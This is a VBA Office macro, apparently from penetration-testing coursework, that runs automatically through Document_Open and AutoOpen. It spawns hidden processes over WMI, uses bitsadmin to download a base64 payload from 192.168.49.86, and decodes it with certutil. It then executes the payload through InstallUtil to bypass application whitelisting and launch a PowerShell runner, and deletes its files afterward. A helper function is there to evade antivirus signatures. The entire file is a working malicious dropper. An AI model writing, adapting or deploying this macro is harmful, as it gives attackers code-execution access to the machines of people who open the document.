' Reverses input string
' Go through strings and reverse them. Add "KEY" to strings to break up signatures
Function rev(fixme)
    rev = Replace(StrReverse(fixme), "KEY", "")
End Function

Function Delay(ms)
    Delay = Timer + ms / 1000
    While Timer < Delay: DoEvents: Wend
End Function


Sub Mymacro()
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")

    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = 12
    
    Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")

    Dim strArg As String

    ' Download certutil encoded constrained delegation bypass
    strArg = "bitsadmin /Transfer 1 http://192.168.49.86/InstallUtil.b64 C:\Windows\Temp\InstallUtil.txt"

    Err = objProcess.Create(strArg, Null, objConfig, pid)
    
    Delay 5000
    
    ' Decode bypass
    strArg = "certutil -decode C:\Windows\Temp\InstallUtil.txt C:\Windows\Temp\InstallUtil.exe"
    Err = objProcess.Create(strArg, Null, objConfig, pid)
    
    ' Delete encoded file, not used anymore
    strArg = "cmd /c del C:\Windows\Temp\InstallUtil.txt"
    Err = objProcess.Create(strArg, Null, objConfig, pid)
    
    ' Execute code in Uninstall function to download and run powershell runner
    strArg = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\InstallUtil.exe"
    Err = objProcess.Create(strArg, Null, objConfig, pid)
    
    Delay 5000

    ' Delete after running, sleep to wait for automigrate to finish executing
    strArg = "cmd /c del C:\Windows\Temp\InstallUtil.exe"
    Err = objProcess.Create(strArg, Null, objConfig, pid)

    

End Sub

Sub Document_Open()
    Mymacro
End Sub
Sub AutoOpen()
    Mymacro
End Sub
